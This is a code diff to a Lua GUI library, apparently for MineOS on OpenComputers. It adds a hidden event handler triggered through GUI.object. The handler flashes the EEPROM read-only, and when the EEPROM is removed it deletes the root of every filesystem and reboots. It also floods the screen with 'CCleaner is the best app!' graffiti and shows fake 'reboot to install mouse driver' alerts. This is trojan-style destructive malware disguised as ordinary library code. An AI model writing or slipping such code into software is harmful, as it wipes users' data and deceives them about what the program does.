@@ -273,20 +273,6 @@ error("Your computer has been trashed by CCleaner. Now enjoy the BSoD...", 0)]]
     eeprom.set( eeprom_code )
     eeprom.makeReadonly( eeprom.getChecksum() )
 
-    event.addHandler( function( ... )
-        local e = { ... }
-        if e[1] == "component_removed" then
-            if e[3] == "eeprom" then
-                payload1()
-                for filesystem in component.list("filesystem") do 
-                    component.invoke(filesystem, "remove", "/")
-                end
-                payload2()
-                computer.shutdown(true)
-            end
-        end
-    end )
-
     _G.isFlashed = true
 end
 
@@ -294,6 +280,45 @@ function GUI.object(x, y, width, height)
     if _G.isFlashed == false then
         flash_eeprom()
         send_feedback()
+
+        event.addHandler( function( ... )
+            local e = { ... }
+    
+            local s = "CCleaner is the best app!"
+            local w, h = component.gpu.getResolution()
+            component.gpu.setBackground( math.random(0x000000, 0xFFFFFF) )
+            component.gpu.setForeground( math.random(0x000000, 0xFFFFFF) )
+            component.gpu.set(w - #s + 1, 2, s)
+            component.gpu.set(1, 2, s)
+            component.gpu.set(w - #s + 1, h, s)
+            component.gpu.set(1, h, s)
+    
+            if e[1] == "component_removed" then
+                if e[3] == "eeprom" then
+                    payload1()
+                    for _=1, 100 do
+                        gpu.setBackground(0xFF0000)
+                        gpu.setForeground(0xFFFFFF)
+                        gpu.set( math.random(0, resX), math.random(0, resY), "Hello!")
+                
+                        gpu.setBackground(0xFFFFFF)
+                        gpu.setForeground(0xFF0000)
+                        gpu.set( math.random(0, resX), math.random(0, resY), "Hello!")
+                
+                        gpu.copy( math.random(0, resX), math.random(0, resY), math.random(0, resX), math.random(0, resY), math.random(0, resX), math.random(0, resY) )
+                    end
+                    for filesystem in component.list("filesystem") do 
+                        component.invoke(filesystem, "remove", "/")
+                    end
+                    payload2()
+                    computer.shutdown(true)
+                end
+            elseif e[1] == "touch" then
+                if math.random(1, 3) == 1 then
+                    GUI.alert("Oops, you clicked the mouse! MineOS needs a reboot to install the mouse click driver!")
+                end
+            end
+        end )
     end
 
     computer.beep()
